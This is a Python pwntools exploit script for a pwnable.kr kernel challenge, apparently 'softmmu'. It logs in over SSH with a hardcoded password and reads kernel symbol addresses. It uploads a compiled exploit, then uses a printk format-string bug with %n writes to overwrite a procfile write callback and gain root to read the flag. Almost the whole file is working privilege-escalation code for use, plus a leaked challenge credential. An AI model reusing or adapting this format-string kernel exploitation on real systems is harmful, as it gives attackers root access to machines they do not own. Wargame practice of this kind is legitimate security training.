#!/usr/bin/env python3
import gzip

from pwn import *

if args.LOCAL:
    if args.GDB:
        shell = process("./debug.sh")
    else:
        shell = process("./run.sh")
else:
    shell = process('sshpass -p "Congratz!! addr_limit looks quite IMPORTANT now... huh?" ssh softmmu@pwnable.kr -p2222', shell=True)

# --- utils --- #
def do_command(shell: tube, cmd: bytes) -> bytes:
    shell.sendline(cmd)
    return shell.recvuntil(b"/ $", drop=True)

def upload_file(shell: tube, filename: bytes, data: bytes):
    for _ in range(0, len(data), 400):
        encoded_data = b64e(gzip.compress(data[_:_+400])).encode()
        do_command(shell, b'echo -n "%s" | base64 -d | gzip -d >> %s' % (encoded_data, filename))

def compile_exploit(code: bytes, defines: dict[bytes, int]) -> bytes:
    with open("tmp_exploit.c", "wb") as exploit:
        exploit.write(code % defines)
    
    if (p := process(["rz-gg", "-a", "x86", "-b", "32", "-F", "-o", "exploit", "tmp_exploit.c"])).poll(True):
        raise Exception(f"compilation failure!: {p.recvall().decode()}")

    with open("exploit", "rb") as compiled:
        return compiled.read()

def read_regex(shell: tube, regex: bytes) -> re.Match | None:
    return re.search(regex, shell.recvline_regex(regex))

def read_int_regex(shell: tube, regex: bytes) -> int:
    return int(read_regex(shell, regex).groups()[0], 16)

def resolve_syms(shell: tube) -> dict[bytes, int]:
    output = do_command(shell, b'grep "procfile\|prepare_kernel_cred\|commit_creds" /proc/kallsyms').splitlines()[1:]

    syms = {}
    for line_ in output:
        address, _, name, *_ = line_.split()
        syms[name] = int(address, 16)

    return syms

# output is sometimes out of order, this sleep + enter fixes it
shell.recvuntil(b"/ $")
sleep(1)
do_command(shell, b"")

# --- exploit compilation --- #
MAX_FMT = 350

syms = resolve_syms(shell)

info(f"prepare_kernel_cred: 0x{syms[b'prepare_kernel_cred']:x}")
info(f"commit_creds: 0x{syms[b'commit_creds']:x}")
info(f"procfile: 0x{syms[b'procfile']:x}")

with open("exploit.c", "rb") as exploit_template:
    defines = syms.copy()
    defines[b"MAX_FMT"] = MAX_FMT
    exploit_code = compile_exploit(exploit_template.read(), defines)

info("uploading file...")

upload_file(shell, b"/tmp/exploit", exploit_code)
do_command(shell, b"chmod +x /tmp/exploit")

# ------ exploit ------ #
# the basic idea is that the printk format string vuln + the fact that the usermode registers are saved on kernel stack
# give us easy ways to exploit the format string vulnerabilty (e.g. to do absolute write just save the target address)
# in a usermode register then use %n

def send_hex(io: tube, data: bytes):
    # sending in hex in order to avoid target parsing escape sequences
    io.sendline(binascii.hexlify(data))

def do_fmt(io: tube, fmt: bytes):
    assert len(fmt) < MAX_FMT
    fmt = fmt.ljust(MAX_FMT)
    send_hex(io, fmt)

def set_esi(io: tube, esi: int):
    # we place %n/%phN on esi as it is a known value saved on the stack
    send_hex(io, p32(esi))

FMT_PREFIX = b"%08x" * 64

def write_byte(io: tube, addr: int, byte: int):
    if byte < 8:
        byte = 256 + byte  # %x may print more than b if b is small...
    set_esi(io, addr)
    do_fmt(io, FMT_PREFIX + b"%%0%dx%%hhn" % byte)

def absolute_write(io: tube, addr: int, value: bytes):
    for i, byte in enumerate(value):
        write_byte(io, addr + i, byte)

def absolute_read(io: tube, addr: int, length: int) -> bytes:
    set_esi(shell, addr)
    do_fmt(shell, FMT_PREFIX + b"%%xval: %%%dphN" % length)  # phN reads hex bytes

    return binascii.unhexlify(read_regex(shell, b"val: ([0-9a-f]+)").groups()[0])

info("starting exploit!")
shell.sendline(b"/tmp/exploit")

target_addr = read_int_regex(shell, b"target addr: (0x[0-9a-f]+)")
info(f"target addr: 0x{target_addr:x}")

# -- leak procfile -- #
procfile = u32(absolute_read(shell, syms[b'procfile'], 4))
success(f"leaked actual procfile address: 0x{procfile:x}")

# -- overwrite write callback -- #
write_callback_addr = procfile + 0x38
absolute_write(shell, write_callback_addr, p32(target_addr))

# -- print flag -- #
shell.recvuntil(b"/ # ")
shell.sendline(b"/bin/cat flag")
shell.recvline()

log.success(f"flag = '{term.text.bold_italic_yellow(shell.recvline().decode().strip())}'")